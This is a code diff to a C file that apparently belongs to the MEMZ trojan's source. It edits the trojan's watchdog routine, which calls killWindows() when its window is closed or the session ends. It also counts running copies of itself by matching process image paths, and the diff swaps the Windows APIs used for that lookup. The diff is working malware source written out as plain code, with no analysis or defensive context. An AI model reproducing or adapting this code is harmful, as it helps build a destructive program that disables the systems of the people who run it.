@@ -1,6 +1,9 @@
 #include "../MEMZ.h"
 
 #ifndef CLEAN
+//extern DWORD GetProcessImageFileNameA(HANDLE, LPSTR, DWORD);
+//extern int QueryFullProcessImageNameA(HANDLE, DWORD, LPSTR, DWORD *);
+
 LRESULT CALLBACK watchdogWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
 		killWindows();
@@ -14,12 +17,16 @@ DWORD WINAPI watchdogThread(LPVOID parameter) {
 	int oproc = 0;
 
 	char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
+#if 0
 	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);
+#else
+	GetModuleFileNameA(NULL, fn, 512);
+#endif
 
 	Sleep(1000);
 
 	for (;;) {
-		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 		PROCESSENTRY32 proc;
 		proc.dwSize = sizeof(proc);
 
@@ -29,7 +36,15 @@ DWORD WINAPI watchdogThread(LPVOID parameter) {
 		do {
 			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
 			char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
+#if 0
+#if 0
 			GetProcessImageFileNameA(hProc, fn2, 512);
+#else
+			QueryFullProcessImageNameA(hProc, 0, fn2, 512);
+#endif
+#else
+			GetModuleFileNameEx(hProc, NULL, fn2, 512);
+#endif
 
 			if (!lstrcmpA(fn, fn2)) {
 				nproc++;
